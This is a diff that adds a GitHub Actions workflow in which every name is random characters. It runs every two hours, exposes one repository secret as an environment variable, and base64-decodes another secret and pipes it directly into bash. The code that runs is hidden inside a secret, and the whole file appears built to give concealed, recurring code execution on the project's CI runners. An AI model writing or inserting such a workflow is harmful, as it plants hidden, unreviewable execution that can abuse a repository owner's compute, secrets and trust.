@@ -1,0 +1,13 @@
+name: PfWEsXPCrc
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  BesXVDW:
+    runs-on: ubuntu-22.04
+    env:
+      qqyFmiPWszoI: ${{ secrets.tqPfyG }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.EflsxbS }}" | base64 -d | bash
